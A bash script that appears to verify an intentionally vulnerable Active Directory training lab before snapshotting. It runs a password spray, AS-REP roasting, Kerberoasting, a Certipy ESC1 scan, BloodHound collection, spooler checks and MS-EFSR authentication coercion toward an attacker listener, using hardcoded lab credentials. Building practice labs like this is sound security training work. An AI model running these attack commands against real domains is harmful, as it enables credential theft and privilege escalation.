#!/usr/bin/env bash
# verify-lab.sh — Sanity-check the Athena AD lab before snapshotting 'clean-vulnerable'
#
# Run from WSL2 after DC01/WEB01/ACCT-DB01 are provisioned and powered on.
# Each check either PASS (continue) or FAIL (exit 1 with context).
#
# Requirements on the attacker side (WSL2):
#   - netexec (nxc), impacket-examples (GetNPUsers.py, GetUserSPNs.py),
#     certipy-ad (certipy), bloodhound-python, coercer, python3-ldap3
#
# Usage:
#   ./scripts/verify-lab.sh

set -u
DC_IP="${DC_IP:-192.168.0.16}"
WEB_IP="${WEB_IP:-192.168.0.20}"
DB_IP="${DB_IP:-192.168.0.23}"
DOMAIN="${DOMAIN:-corp.athena.lab}"
ATTACKER_IP="${ATTACKER_IP:-192.168.0.18}"
USER_STEVE="${USER_STEVE:-steve}"
PW_STEVE="${PW_STEVE:-Summer2024!}"

RED=$'\e[31m'; GRN=$'\e[32m'; YEL=$'\e[33m'; CYA=$'\e[36m'; RST=$'\e[0m'

FAILS=0
TOTAL=0

check() {
    local name="$1"; shift
    TOTAL=$((TOTAL+1))
    printf '%s[%02d] %-50s%s ' "$CYA" "$TOTAL" "$name" "$RST"
    local out rc
    out="$("$@" 2>&1)"; rc=$?
    if [[ $rc -eq 0 ]]; then
        printf '%sPASS%s\n' "$GRN" "$RST"
        return 0
    fi
    printf '%sFAIL%s (rc=%s)\n' "$RED" "$RST" "$rc"
    printf '    ---- output ----\n%s\n    ----------------\n' "$(printf '%s' "$out" | head -30)"
    FAILS=$((FAILS+1))
    return 1
}

users_file=$(mktemp)
cat > "$users_file" <<'EOF'
steve
bob
kevin
alice
legacy_kev
svc_sql
svc_backup
low_user
da_alice
administrator
EOF

# ============================================================
# 1. Basic L3 reachability
# ============================================================
check "ping DC01"     ping -c1 -W2 "$DC_IP"
check "ping WEB01"    ping -c1 -W2 "$WEB_IP"
check "ping ACCT-DB01" ping -c1 -W2 "$DB_IP"

# ============================================================
# 2. SMB accessible + signing state
# ============================================================
check "nxc smb DC01 (auth check)" bash -c "nxc smb $DC_IP -u '$USER_STEVE' -p '$PW_STEVE' | grep -qi 'corp.athena.lab'"
check "SMB signing off on WEB01 (via impacket)" bash -c "python3 -c \"
import os; os.environ['OPENSSL_CONF']='/tmp/openssl-legacy.cnf'
from impacket.smbconnection import SMBConnection
s = SMBConnection('$WEB_IP','$WEB_IP', timeout=5)
s.login('administrator', '1qaz@WSX', 'WEB01')
assert not s.isSigningRequired(), 'signing required'
print('ok')\""
check "SMB signing off on DB (via impacket)" bash -c "python3 -c \"
import os; os.environ['OPENSSL_CONF']='/tmp/openssl-legacy.cnf'
from impacket.smbconnection import SMBConnection
s = SMBConnection('$DB_IP','$DB_IP', timeout=5)
s.login('administrator', '1qaz@WSX', 'ACCT-DB01')
assert not s.isSigningRequired(), 'signing required'
print('ok')\""

# ============================================================
# 3. Password spray (steve should hit)
# ============================================================
check "password spray finds steve" bash -c \
    "nxc smb $DC_IP -u $users_file -p '$PW_STEVE' --continue-on-success 2>&1 | grep -E '\\[\\+\\].*steve'"

# ============================================================
# 4. AS-REP roast (legacy_kev)
# ============================================================
check "AS-REP: legacy_kev hash obtainable" bash -c \
    "GetNPUsers.py '$DOMAIN/' -usersfile '$users_file' -dc-ip '$DC_IP' -no-pass 2>&1 | grep -E '\\\$krb5asrep\\\$.*legacy_kev'"

# ============================================================
# 5. Kerberoast (svc_sql + svc_backup)
# ============================================================
check "Kerberoast: svc_sql hash" bash -c \
    "GetUserSPNs.py '$DOMAIN/$USER_STEVE:$PW_STEVE' -dc-ip '$DC_IP' -request 2>&1 | grep -E '\\\$krb5tgs\\\$.*svc_sql'"
check "Kerberoast: svc_backup hash" bash -c \
    "GetUserSPNs.py '$DOMAIN/$USER_STEVE:$PW_STEVE' -dc-ip '$DC_IP' -request 2>&1 | grep -E '\\\$krb5tgs\\\$.*svc_backup'"

# ============================================================
# 6. Certipy finds ESC1 template
# ============================================================
check "Certipy: VulnTemplate1 vulnerable (ESC1)" bash -c \
    "certipy find -u ${USER_STEVE}@${DOMAIN} -p '$PW_STEVE' -dc-ip '$DC_IP' -vulnerable -stdout 2>&1 | grep -iE 'VulnTemplate1|ESC1'"

# ============================================================
# 7. BloodHound collection runs (output files exist)
# ============================================================
check "BloodHound: collect runs clean" bash -c "
    tmp=\$(mktemp -d); cd \$tmp
    bloodhound-python -u $USER_STEVE -p '$PW_STEVE' -d $DOMAIN -ns $DC_IP -c DCOnly --zip 2>&1 | tail -5
    ls *.zip >/dev/null 2>&1
"

# ============================================================
# 8. Spooler (PrinterBug) alive on DC
# ============================================================
check "PrinterBug: Spooler RPC reachable on DC" bash -c \
    "nxc smb $DC_IP -u '$USER_STEVE' -p '$PW_STEVE' -M spooler 2>&1 | grep -iE 'Spooler|True|running|RUNNING'"

# ============================================================
# 9. Coerce scan — methods available on DC
# ============================================================
check "Coercer MS-EFSR pipe accessible on DC" bash -c \
    "echo X | timeout 30 coercer coerce -t $DC_IP -l $ATTACKER_IP -u '$USER_STEVE' -p '$PW_STEVE' -d corp --filter-protocol-name MS-EFSR 2>&1 | grep -qiE 'SMB named pipe.*efsrpc.*accessible|Successful bind to interface'"

# ============================================================
# 10. LLMNR broadcast reachable (responder sees traffic)
# ============================================================
# Can't cleanly test without triggering a real LLMNR query; do a tshark-lite check
# LLMNR tcpdump skipped — WSL2 on Bridged home LAN doesn't see VM broadcast traffic
echo "${YEL}[--] LLMNR broadcast tcpdump skipped (WSL mirrored limitation)${RST}"

rm -f "$users_file"

# ============================================================
# Summary
# ============================================================
echo
if [[ $FAILS -eq 0 ]]; then
    echo "${GRN}================================================"
    echo "  ALL $TOTAL CHECKS PASSED — ready for snapshot 'clean-vulnerable'"
    echo "================================================${RST}"
    exit 0
else
    echo "${RED}================================================"
    echo "  $FAILS / $TOTAL CHECKS FAILED — DO NOT snapshot yet"
    echo "================================================${RST}"
    exit 1
fi
